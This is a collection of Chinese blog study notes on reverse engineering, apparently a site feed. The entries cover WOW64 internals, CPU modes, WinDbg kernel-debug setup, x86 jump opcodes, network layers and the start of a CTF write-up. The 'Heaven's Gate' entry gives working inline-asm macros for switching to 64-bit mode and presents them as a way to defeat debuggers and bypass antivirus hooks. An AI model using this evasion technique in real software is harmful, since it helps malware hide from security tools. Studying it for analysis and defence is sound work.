        <content type="html"><![CDATA[<h2 id="天堂之门">天堂之门</h2><p>在32位进程中，调用32位系统函数的操作是通过WOW64实现的。WOW64在内部转换为64位，然后进行64位DLL的调用，从而实现了在64位机上兼容运行32位的操作。</p><p>在长模式下，段寄存器用作权限和标志的区分<br>使用WinDbg进行调试：</p><p>CS:23-&gt;gdt偏移:4*8 = 20<br>CS:33-&gt;gdt偏移:6*8 = 30</p><p><img src="https://s2.loli.net/2024/12/29/PhAFVyJl6iIqtLv.png" alt="image-20241229225553947"></p><p>可以看出23指向的段描述符的Long位为NL，而33指向的为Lo，说明33指向的是64位区域，23指向的是32位区域</p><p>对于不同的段选择子，CPU会选择对应的机器码解释方式去翻译机器码。<br>在软件上，有对应的32位函数实现32到64的转换然后进入64位的操作系统内核，因为(64位的操作系统一定是64位的，要执行内核代码必须先转为64位执行)</p><h3 id="WOW64">WOW64</h3><p>基本调用流程：<br>32位进程调用32位系统API，其中系统API调用<code>dword ptr fs:[000000C0]</code>，即TEB表偏移C0的WOW32Reserved，第一行代码为jmp     0033:77877009，表明先切换为64位，然后跳转到77877009，位于wow64cpu.dll中，首先保存了环境堆栈，然后切换为64为的堆栈<br>最后通过<code>jmp     qword ptr [r15+rcx*8]</code>执行函数调用，r15为函数表，rcx为偏移</p><p>[<a href="https://bbs.kanxue.com/thread-221236.htm">分享][原创]汇编里看Wow64的原理（浅谈32位程序是怎样在windows 64上运行的？）-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p><h3 id="作用">作用</h3><p>反调试：几乎所有调试器均不能正常调试切换后的代码<br>防钩子：如果杀软只对32位DLL执行了Hook，那么这个方法可以直接绕过32位入口直接调用64位函数。</p><h3 id="实现">实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SWITCH_TO_X64  \</span></span><br><span class="line"><span class="meta">do &#123;               \</span></span><br><span class="line"><span class="meta">__asm push 0x33       \</span></span><br><span class="line"><span class="meta">__asm _emit 0xE8 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm add dword ptr [esp], 5 \</span></span><br><span class="line"><span class="meta">__asm retf            \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWITCH_TO_X86  \</span></span><br><span class="line"><span class="meta">do &#123;               \</span></span><br><span class="line"><span class="meta">__asm _emit 0xE8 <span class="comment">/* call $+5 */</span> \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0xC7 <span class="comment">/* mov dword [rsp+4], 0x23 */</span> \</span></span><br><span class="line"><span class="meta">__asm _emit 0x44 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x24 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x04 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x23 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x83 <span class="comment">/* add dword [rsp], 0xD */</span> \</span></span><br><span class="line"><span class="meta">__asm _emit 0x04 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x24 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x0D \</span></span><br><span class="line"><span class="meta">__asm _emit 0xCB <span class="comment">/* retf */</span> \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>切换为64位时，需要使用64位汇编的立即数，我感觉可以创建几个辅助的64位DLL帮我执行那些函数</p><p>对于反调试的作用，自然是已经实现了，如果要实现不使用WOW64去执行函数，需要以下操作：</p><ul><li>切换进程到64位</li><li>获取gs:[60h]得到PEB</li><li>遍历ldr的InMemoryOrderModuleList找到Ntdll64的模块地址</li><li>在Ntdll中获取需要的函数进行操作</li></ul><p>如果不是Ntdll中的函数，需要找到Ntdll中的LdrLoadDll函数，在64位中执行加载库函数操作，然后取函数地址并执行。</p><p>这个部分汇编写得太恶心了，之后再实现吧QAQ</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 技能 </category>
          
          <category> 反调试 </category>
          
          <category> 天堂之门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> WOW64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win-计算机启动时的模式过渡</title>
      <link href="/posts/bb94a573.html"/>
      <url>/posts/bb94a573.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/673712331">第四章 处理器模式与硬件内存管理(x86_64) - 从零开始开发UEFI引导的64位操作系统内核 - 知乎</a></p><p>本文为上面这个网址的摘抄</p><p><img src="https://s2.loli.net/2024/12/27/Lzi1KnslSqB2hmu.png" alt="image-20241227011304326"></p><h2 id="几种模式">几种模式</h2><h3 id="实模式">实模式</h3><blockquote><p>处理位数被设为16位。在这个模式中，处理器只能访问物理地址的前1MB空间，通过段寄存器左移4位后与一个16位地址相加得到的20位地址访问。</p></blockquote><h3 id="32位实模式">32位实模式</h3><blockquote><p>不开启保护模式的32位模式是不稳定的，处理器只能暂时处于<code>32位实模式</code>的状态，需要开启保护模式才能正常执行32位程序。</p></blockquote><h3 id="保护模式">保护模式</h3><blockquote><p>准备保护模式数据结构后将<code>cr0</code>寄存器的<code>PE</code>标志位置位即可开启。这个“保护模式数据结构”指的是<code>GDT</code>，全局描述符表，表中可以添加<code>段描述符</code>、<code>系统描述符</code>。保护模式下的段寄存器通过访问<code>段描述符</code>确定所在的段，而不是左移4位后直接与地址相加；保护模式有许多硬件直接触发的保护功能，系统描述符用于支持这些功能的触发。此外，保护模式中引入了<code>特权级</code>，<code>0</code>为最高的特权级，<code>3</code>为最低的特权级，越高的特权级，保护功能越弱，程序越容易控制处理器的状态。内核通常在<code>0</code>特权级运行，普通程序通常在<code>3</code>特权级运行。同时，在这个模式中也引入了分页机制（不是必须开启）。32位的基本分页机制使用一级页表进行寻址，能够映射4GB空间，开启<code>PAE</code>后，在原先的以及页表上增加了两级页表，通过类似树状的数据结构使得相同大小的最高级页表能够映射<code>64PB</code>的空间。<code>PAE</code>开启后使用36位物理地址，使得物理地址寻址能力提高到了<code>64GB</code>。</p></blockquote><h3 id="长模式">长模式</h3><blockquote><p>由<code>实模式</code>切换而来的<code>32位保护模式</code>被称为<code>IA-32</code>模式。由于64位模式仅仅是在<code>IA-32</code>模式基础上经过简单的功能增强和修改得到的，所以被称为<code>IA-32e</code>模式。</p><p>主要有这些功能：<code>分页机制</code>、<code>长模式地址扩展（LME）</code>、<code>64位段描述符</code>。<code>长模式地址扩展</code>中为分页机制又增加了一级或两级页表，使用4级或5级页表映射地址空间。同时使用48位物理地址，进一步提高物理地址寻址能力。也因为<code>48位物理地址</code>称为<code>长地址</code>，<code>IA-32e</code>模式又称<code>长模式</code>。由于描述符表中支持<code>32位段描述符</code>和<code>64位段描述符</code>同时存在，所以可以通过暂时关闭<code>LME</code>并修改段寄存器索引的段描述符，进入一种支持32位程序运行的<code>IA-32e</code>的子模式，称为<code>兼容模式</code>。虽然所谓的<code>兼容模式</code>只是<code>IA-32e</code>模式的一种支持32位程序运行的<strong>状态</strong>，但我们依然习惯地称<code>IA-32e的支持64位程序运行的状态</code>和<code>IA-32e的支持32位程序运行的状态</code>为<code>IA-32e</code>的两个子模式<code>长模式</code>和<code>兼容模式</code>。</p></blockquote><h2 id="内存布局">内存布局</h2><h3 id="分段">分段</h3><p>通过段寄存器加偏移的方式索引真实物理地址</p><h3 id="分页">分页</h3><p>存在线性连续的虚拟地址，得到虚拟地址后，通过页表映射到对应的物理地址</p><h3 id="分段-分页">分段+分页</h3><p>通过段寄存器加偏移的方式索引到虚拟内存，通过页表映射到对应的物理内存</p><h3 id="平坦内存模型">平坦内存模型</h3><p>舍弃了大多数分段机制，保留了段寄存器的权限限制能力。在64位下，可以直接用单一段访问整个4G的虚拟内存空间，因此每个段的基址均为0，无限段长，直接用对应权限的段+偏移量索引虚拟地址，然后通过页表映射到对应的物理内存。</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> win核心 </category>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WinDbg-调试环境搭建</title>
      <link href="/posts/5c35dd38.html"/>
      <url>/posts/5c35dd38.html</url>
      
        <content type="html"><![CDATA[<h2 id="下载">下载</h2><h3 id="下载Win10镜像">下载Win10镜像</h3><p>略</p><h3 id="下载WinDbg">下载WinDbg</h3><p>链接：<a href="https://pan.baidu.com/s/135mYBWw3S3B9-jkuMrm5Lg">https://pan.baidu.com/s/135mYBWw3S3B9-jkuMrm5Lg</a><br>提取码：w7j5</p><h2 id="安装">安装</h2><p>用VMware安装iso镜像</p><h2 id="配置">配置</h2><p>一开始我使用了pipe和com去连接，但是始终连接不上，如果想用这种方法连接，可以看看这个博客</p><p><a href="https://xchen.cc/post/doubledebug/">搞定Windbg 串口双机调试 - 忆杰的博客 - 专注于软件逆向、调试、反调试、内核开发、硬件虚拟化</a></p><p>注意要让baudrate一样，在设备管理器中选择相同的速率</p><h3 id="NET连接">NET连接</h3><p>ipconfig得到本机ip，假设为127.0.0.1</p><h4 id="虚拟机中">虚拟机中</h4><p>管理员模式输入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bcdedit</span> /dbgsettings net hostip:主机ip port:<span class="number">50000</span> key:<span class="number">1.1.1.1</span></span><br></pre></td></tr></table></figure><p>1.1.1.1可以用其它的。</p><p>打开调试：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bcdedit</span> /<span class="literal">debug</span> <span class="literal">on</span></span><br></pre></td></tr></table></figure><p>打开引导调试：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bcdedit</span> /bootdebug <span class="literal">on</span></span><br></pre></td></tr></table></figure><p>允许测试签名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set testsigning <span class="built_in">yes</span></span><br></pre></td></tr></table></figure><h4 id="调试机中">调试机中</h4><blockquote><p>打开对应位数的WinDbg</p><p>File -&gt; Kernel Debug</p><p>第一个页面就是NET，port选50000，key填上面写的key</p><p>然后WinDbg应该在等待状态。</p><p>重启虚拟机，即可看到调试启动。</p></blockquote><p>如果是最新版本的WinDbg</p><blockquote><p>文件-&gt;Attach to kernel</p><p>Net，设置端口50000，Key，直接连接</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>汇编1-控制转移</title>
      <link href="/posts/8f1f1d37.html"/>
      <url>/posts/8f1f1d37.html</url>
      
        <content type="html"><![CDATA[<p>汇编是如何实现指令之间的跳转</p><h3 id="指令">指令</h3><ul><li>JMP，跳转指令</li><li>CALL，过程调用指令</li><li>LOOP，循环指令</li></ul><h3 id="段寄存器">段寄存器</h3><ul><li>CS：code segment 指令段寄存器</li><li>DS：data segment 数据段寄存器</li><li>SS：stack segment 栈段寄存器</li><li>ES：不知道英文，但是是辅助段寄存器</li><li>fs,gs：一般存操作系统的线程本地存储</li></ul><h2 id="跳转指令">跳转指令</h2><table><thead><tr><th>操作码</th><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>EB <strong>cb</strong></td><td>JMP <strong>rel8</strong></td><td>相对短跳转，位移量相对于下一条指令</td></tr><tr><td>E9 <strong>cw</strong></td><td>JMP <strong>rel16</strong></td><td>相对近跳转，位移量相对于下一条指令</td></tr><tr><td>E9 <strong>cd</strong></td><td>JMP <strong>rel32</strong></td><td>相对近跳转，位移量相对于下一条指令</td></tr><tr><td>FF /4</td><td>JMP <strong>r/m16</strong></td><td>绝对间接近跳转，地址由 <strong>r/m16</strong> 给出</td></tr><tr><td>FF /4</td><td>JMP <strong>r/m32</strong></td><td>绝对间接近跳转，地址由 <strong>r/m32</strong> 给出</td></tr><tr><td>EA <strong>cd</strong></td><td>JMP <strong>ptr16:16</strong></td><td>绝对远跳转，地址由操作数给出</td></tr><tr><td>EA <strong>cp</strong></td><td>JMP <strong>ptr16:32</strong></td><td>绝对远跳转，地址由操作数给出</td></tr><tr><td>FF /5</td><td>JMP <strong>m16:16</strong></td><td>绝对间接远跳转，地址由 <strong>m16:16</strong> 给出</td></tr><tr><td>FF /5</td><td>JMP <strong>m16:32</strong></td><td>绝对间接远跳转，地址由 <strong>m16:32</strong> 给出</td></tr></tbody></table><p>分为三种：</p><ul><li>段内跳转：由本段段寄存器作为基址+偏移的跳转</li><li>相对跳转：由下一条指令地址作为基址+偏移的跳转</li><li>远跳转：由一个段寄存器作为基址+偏移的跳转</li><li>任务切换：略（切换进程/线程）</li></ul><h3 id="条件跳转">条件跳转</h3><table><thead><tr><th>操作码</th><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>77 <strong>cb</strong></td><td>JA <strong>rel8</strong></td><td>高于（CF=0 且 ZF=0）时短跳转</td></tr><tr><td>73 <strong>cb</strong></td><td>JAE <strong>rel8</strong></td><td>高于或等于 (CF=0) 时短跳转</td></tr><tr><td>72 <strong>cb</strong></td><td>JB <strong>rel8</strong></td><td>低于 (CF=1) 时短跳转</td></tr><tr><td>76 <strong>cb</strong></td><td>JBE <strong>rel8</strong></td><td>低于或等于（CF=1 或  ZF=1）时短跳转</td></tr><tr><td>72 <strong>cb</strong></td><td>JC <strong>rel8</strong></td><td>进位 (CF=1) 时短跳转</td></tr><tr><td>E3 <strong>cb</strong></td><td>JCXZ <strong>rel8</strong></td><td>CX 寄存器为 0 时短跳转</td></tr><tr><td>E3 <strong>cb</strong></td><td>JECXZ <strong>rel8</strong></td><td>ECX 寄存器为 0 时短跳转</td></tr><tr><td>74 <strong>cb</strong></td><td>JE <strong>rel8</strong></td><td>等于 (ZF=1) 时短跳转</td></tr><tr><td>7F <strong>cb</strong></td><td>JG <strong>rel8</strong></td><td>大于（ZF=0 且 SF=OF）时短跳转</td></tr><tr><td>7D <strong>cb</strong></td><td>JGE <strong>rel8</strong></td><td>大于或等于 (SF=OF) 时短跳转</td></tr><tr><td>7C <strong>cb</strong></td><td>JL <strong>rel8</strong></td><td>小于 (SF&lt;&gt;OF)  时短跳转</td></tr><tr><td>7E <strong>cb</strong></td><td>JLE <strong>rel8</strong></td><td>小于或等于（ZF=1 或  SF&lt;&gt;OF）时短跳转</td></tr><tr><td>76 <strong>cb</strong></td><td>JNA <strong>rel8</strong></td><td>不高于（CF=1 或 ZF=1）时短跳转</td></tr><tr><td>72 <strong>cb</strong></td><td>JNAE <strong>rel8</strong></td><td>不高于或等于 (CF=1) 时短跳转</td></tr><tr><td>73 <strong>cb</strong></td><td>JNB <strong>rel8</strong></td><td>不低于 (CF=0) 时短跳转</td></tr><tr><td>77 <strong>cb</strong></td><td>JNBE <strong>rel8</strong></td><td>不低于或等于（CF=0 或  ZF=0）时短跳转</td></tr><tr><td>73 <strong>cb</strong></td><td>JNC <strong>rel8</strong></td><td>无进位 (CF=0) 时短跳转</td></tr><tr><td>75 <strong>cb</strong></td><td>JNE <strong>rel8</strong></td><td>不相等 (ZF=0) 时短跳转</td></tr><tr><td>7E <strong>cb</strong></td><td>JNG <strong>rel8</strong></td><td>不大于（ZF=1 或  SF&lt;&gt;OF）时短跳转</td></tr><tr><td>7C <strong>cb</strong></td><td>JNGE <strong>rel8</strong></td><td>不大于或等于 (SF&lt;&gt;OF)  时短跳转</td></tr><tr><td>7D <strong>cb</strong></td><td>JNL <strong>rel8</strong></td><td>不小于 (SF＝OF) 时短跳转</td></tr><tr><td>7F <strong>cb</strong></td><td>JNLE <strong>rel8</strong></td><td>不小于或等于（ZF=0 且  SF=OF）时短跳转</td></tr><tr><td>71 <strong>cb</strong></td><td>JNO <strong>rel8</strong></td><td>不上溢 (OF=0) 时短跳转</td></tr><tr><td>7B <strong>cb</strong></td><td>JNP <strong>rel8</strong></td><td>奇校验 (PF=0) 时短跳转</td></tr><tr><td>79 <strong>cb</strong></td><td>JNS <strong>rel8</strong></td><td>正数时 (SF＝0) 短跳转</td></tr><tr><td>75 <strong>cb</strong></td><td>JNZ <strong>rel8</strong></td><td>不为零 (ZF=0) 时短跳转</td></tr><tr><td>70 <strong>cb</strong></td><td>JO <strong>rel8</strong></td><td>上溢 (OF=1) 时短跳转</td></tr><tr><td>7A <strong>cb</strong></td><td>JP <strong>rel8</strong></td><td>偶校验 (PF=1) 时短跳转</td></tr><tr><td>7A <strong>cb</strong></td><td>JPE <strong>rel8</strong></td><td>偶校验 (PF=1) 时短跳转</td></tr><tr><td>7B <strong>cb</strong></td><td>JPO <strong>rel8</strong></td><td>奇校验 (PF=0) 时短跳转</td></tr><tr><td>78 <strong>cb</strong></td><td>JS <strong>rel8</strong></td><td>负数 (SF=1) 时短跳转</td></tr><tr><td>74 <strong>cb</strong></td><td>JZ <strong>rel8</strong></td><td>为零 (ZF $\leftarrow$ 1) 时短跳转</td></tr><tr><td>0F 87 <strong>cw/cd</strong></td><td>JA <strong>rel16/32</strong></td><td>高于（CF=0 且 ZF=0）时近跳转</td></tr><tr><td>0F 83 <strong>cw/cd</strong></td><td>JAE <strong>rel16/32</strong></td><td>高于或等于 (CF=0) 时近跳转</td></tr><tr><td>0F 82 <strong>cw/cd</strong></td><td>JB <strong>rel16/32</strong></td><td>低于 (CF=1) 时近跳转</td></tr><tr><td>0F 86 <strong>cw/cd</strong></td><td>JBE <strong>rel16/32</strong></td><td>低于或等于（CF=1 或  ZF=1）时近跳转</td></tr><tr><td>0F 82 <strong>cw/cd</strong></td><td>JC <strong>rel16/32</strong></td><td>进位 (CF=1) 时近跳转</td></tr><tr><td>0F 84 <strong>cw/cd</strong></td><td>JE <strong>rel16/32</strong></td><td>相等 (ZF=1) 时近跳转</td></tr><tr><td>0F 84 <strong>cw/cd</strong></td><td>JZ <strong>rel16/32</strong></td><td>为 0 (ZF=1) 时近跳转</td></tr><tr><td>0F 8F <strong>cw/cd</strong></td><td>JG <strong>rel16/32</strong></td><td>大于（ZF=0 且  SF=OF）时近跳转</td></tr></tbody></table><table><thead><tr><th>操作码</th><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>0F 8D <strong>cw/cd</strong></td><td>JGE <strong>rel16/32</strong></td><td>大于或等于 (SF=OF) 时近跳转</td></tr><tr><td>0F 8C <strong>cw/cd</strong></td><td>JL <strong>rel16/32</strong></td><td>小于 (SF&lt;&gt;OF)  时近跳转</td></tr><tr><td>0F 8E <strong>cw/cd</strong></td><td>JLE <strong>rel16/32</strong></td><td>小于或等于（ZF=1 或  SF&lt;&gt;OF）时近跳转</td></tr><tr><td>0F 86 <strong>cw/cd</strong></td><td>JNA <strong>rel16/32</strong></td><td>不高于（CF=1 或 ZF=1）时近跳转</td></tr><tr><td>0F 82 <strong>cw/cd</strong></td><td>JNAE <strong>rel16/32</strong></td><td>不高于或等于 (CF=1) 时近跳转</td></tr><tr><td>0F 83 <strong>cw/cd</strong></td><td>JNB <strong>rel16/32</strong></td><td>不低于 (CF=0) 时近跳转</td></tr><tr><td>0F 87 <strong>cw/cd</strong></td><td>JNBE <strong>rel16/32</strong></td><td>不低于或等于（CF=0 或  ZF=0）时近跳转</td></tr><tr><td>0F 83 <strong>cw/cd</strong></td><td>JNC <strong>rel16/32</strong></td><td>无进位 (CF=0) 时近跳转</td></tr><tr><td>0F 85 <strong>cw/cd</strong></td><td>JNE <strong>rel16/32</strong></td><td>不相等 (ZF=0) 时近跳转</td></tr><tr><td>0F 8E <strong>cw/cd</strong></td><td>JNG <strong>rel16/32</strong></td><td>不大于（ZF=1 或  SF&lt;&gt;OF）时近跳转</td></tr><tr><td>0F 8C <strong>cw/cd</strong></td><td>JNGE <strong>rel16/32</strong></td><td>不大于或等于 (SF&lt;&gt;OF)  时近跳转</td></tr><tr><td>0F 8D <strong>cw/cd</strong></td><td>JNL <strong>rel16/32</strong></td><td>不小于 (SF＝OF) 时近跳转</td></tr><tr><td>0F 8F <strong>cw/cd</strong></td><td>JNLE <strong>rel16/32</strong></td><td>不小于或等于（ZF=0 且  SF=OF）时近跳转</td></tr><tr><td>0F 81 <strong>cw/cd</strong></td><td>JNO <strong>rel16/32</strong></td><td>不上溢 (OF=0) 时近跳转</td></tr><tr><td>0F 8B <strong>cw/cd</strong></td><td>JNP <strong>rel16/32</strong></td><td>奇校验 (PF=0) 时近跳转</td></tr><tr><td>0F 89 <strong>cw/cd</strong></td><td>JNS <strong>rel16/32</strong></td><td>正数 (SF＝0) 时近跳转</td></tr><tr><td>0F 85 <strong>cw/cd</strong></td><td>JNZ <strong>rel16/32</strong></td><td>不为零 (ZF=0) 时近跳转</td></tr><tr><td>0F 80 <strong>cw/cd</strong></td><td>JO <strong>rel16/32</strong></td><td>上溢 (OF=1) 时近跳转</td></tr><tr><td>0F 8A <strong>cw/cd</strong></td><td>JP <strong>rel16/32</strong></td><td>偶校验 (PF=1) 时近跳转</td></tr><tr><td>0F 8A <strong>cw/cd</strong></td><td>JPE <strong>rel16/32</strong></td><td>偶校验 (PF=1) 时近跳转</td></tr><tr><td>0F 8B <strong>cw/cd</strong></td><td>JPO <strong>rel16/32</strong></td><td>奇校验 (PF=0) 时近跳转</td></tr><tr><td>0F 88 <strong>cw/cd</strong></td><td>JS <strong>rel16/32</strong></td><td>负数 (SF＝1) 时近跳转</td></tr><tr><td>0F 84 <strong>cw/cd</strong></td><td>JZ <strong>rel16/32</strong></td><td>为 0 (ZF=1) 时近跳转</td></tr></tbody></table><h2 id="过程调用指令">过程调用指令</h2><table><thead><tr><th>操作码</th><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>E8 <strong>cw</strong></td><td>CALL <strong>rel16</strong></td><td>相对近调用，位移量相对于下一条指令</td></tr><tr><td>E8 <strong>cd</strong></td><td>CALL <strong>rel32</strong></td><td>相对近调用，位移量相对于下一条指令</td></tr><tr><td>FF /2</td><td>CALL <strong>r/m16</strong></td><td>绝对间接近调用，地址由 <strong>r/m16</strong> 给出</td></tr><tr><td>FF /2</td><td>CALL <strong>r/m32</strong></td><td>绝对间接近调用，地址由 <strong>r/m32</strong> 给出</td></tr><tr><td>9A <strong>cd</strong></td><td>CALL <strong>ptr16:16</strong></td><td>绝对远调用，地址由操作数给出</td></tr><tr><td>9A <strong>cp</strong></td><td>CALL <strong>ptr16:32</strong></td><td>绝对远调用，地址由操作数给出</td></tr><tr><td>FF /3</td><td>CALL <strong>m16:16</strong></td><td>绝对间接远调用，地址由 <strong>m16:16</strong> 给出</td></tr><tr><td>FF /3</td><td>CALL <strong>m16:32</strong></td><td>绝对间接远调用，地址由 <strong>m16:32</strong> 给出</td></tr></tbody></table><table><thead><tr><th>操作码</th><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>C3</td><td>RET</td><td>近返回到调用过程</td></tr><tr><td>CB</td><td>RET</td><td>远返回到调用过程</td></tr><tr><td>C2 <strong>iw</strong></td><td>RET <strong>imm16</strong></td><td>近返回到调用过程，并从堆栈弹出 <strong>imm16</strong> 个字节</td></tr><tr><td>CA <strong>iw</strong></td><td>RET <strong>imm16</strong></td><td>远返回到调用过程，并从堆栈弹出 <strong>imm16</strong> 个字节</td></tr></tbody></table><p>retf指令：先弹出值到IP寄存器，再弹出值到CS段寄存器实现返回。</p><h2 id="循环指令">循环指令</h2><table><thead><tr><th>操作码</th><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>E2 <strong>cb</strong></td><td>LOOP <strong>rel8</strong></td><td>递减计数；计数  $\not =$ 0 时短跳转</td></tr><tr><td>E1 <strong>cb</strong></td><td>LOOPE <strong>rel8</strong></td><td>递减计数；计数  $\not =$  0 且 ZF=1 时短跳转</td></tr><tr><td>E1 <strong>cb</strong></td><td>LOOPZ <strong>rel8</strong></td><td>递减计数；计数  $\not =$  0 且 ZF=1 时短跳转</td></tr><tr><td>E0 <strong>cb</strong></td><td>LOOPNE <strong>rel8</strong></td><td>递减计数；计数  $\not =$  0 且 ZF=0 时短跳转</td></tr><tr><td>E0 <strong>cb</strong></td><td>LOOPNZ <strong>rel8</strong></td><td>递减计数；计数  $\not =$  0 且 ZF=0 时短跳转</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>五层网络协议小总结</title>
      <link href="/posts/f8da60a2.html"/>
      <url>/posts/f8da60a2.html</url>
      
        <content type="html"><![CDATA[<h2 id="理论五层模型">理论五层模型</h2><p>分为：<br>应用层，传输层，网络层，数据链路层，物理层</p><p>每一层都负责了一部分内容并给上一层打下基础</p><p>协议：每一层通过支持对应的协议来实现本层的功能，两个机器在同一层如果不支持相同的协议，就不能正常通信。</p><h3 id="物理层">物理层</h3><p>作用：实现传输比特信号，需要实现01模拟信号和其它信号之间的转换</p><p>物理实现：中继器，集线器</p><p>对应协议：网线，光纤等的接口类型，传输介质的速率标准等</p><p>流程：从模拟信号转为其它信号后，通过物理路径（引导/非引导）到线路终点再被转为模拟信号</p><p>其它注意点：复用技术（码分多址），X工通信</p><h3 id="数据链路层">数据链路层</h3><p>作用：实现帧的传输，对于上层数据的透明传输（对上层不可见），一定的差错检查。</p><p>物理实现：网卡（MAC地址），交换机</p><p>对应协议：PPP协议和以太网协议（实现封装成帧，透明传输和差错检查）</p><p>流程：对于一段链路，先将网络层下交的数据封装成MAC帧，通过对应的协议去传输帧，交换机维护了一张<code>转发表</code>，在这里找到目的MAC地址后转发给对应的端口，然后交给物理层。如果是主机发送，则直接发给连接的交换机。</p><h3 id="网络层">网络层</h3><p>作用：实现IP数据报的传输，选择合适的路线传送数据。是非主机的设备的最高层</p><p>物理实现：路由器</p><p>对应协议：IP协议，以及它需要的ARP地址解析协议和在它之上的ICMP报文控制协议和IGMP组管理协议。</p><p>流程：对于传输层的数据，先转为对应的IP数据报，从上层得到的套接字中有目的IP地址，通过路由器中的路由选择协议（RIP，OSPF，BGP）更新自己的<code>路由表</code>，通过路由表找到对应的IP地址，然后转发给对应的端口，转发前，通过ARP协议取IP对应的MAC地址，先将MAC帧中的源MAC地址改为这个端口的地址，将目的MAC地址转为下一跳设备的MAC地址。然后发给数据链路层</p><h3 id="传输层">传输层</h3><p>作用：向应用层提供服务，实现进程间的通信。复用和分用。可信传输，差错检查，流量控制，拥塞控制等</p><p>物理实现：主机</p><p>对应协议：TCP/UDP，一个是面向连接的，数据传输的单位是报文段，能够提供可靠的交付。 一个是无连接的，数据传输的单位是用户数据报，不保证提供可靠的交付，只能提供“尽最大努力交付”。</p><p>流程：发送的情况：根据不同的协议要求，然后转为TCP/UDP头部信息。直接给下一层。如果是TCP会有三次交换数据请求连接等这种本层处理的事项。接收的情况：收到后拼接，然后向上发给应用层。</p><h3 id="应用层">应用层</h3><p>作用：实现需要的功能</p><p>物理实现：无</p><p>对应协议：很多，比如：DNS，http等</p><p>流程：对应不同实现有不同流程</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 开发 </category>
          
          <category> 网络编程 </category>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>鹏城杯2024-re-复现</title>
      <link href="/posts/674d40c7.html"/>
      <url>/posts/674d40c7.html</url>
      
        <content type="html"><![CDATA[<h2 id="RE">RE</h2><h3 id="chall-py">chall_py</h3><p>发现全是base，用解密脚本解密为代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> 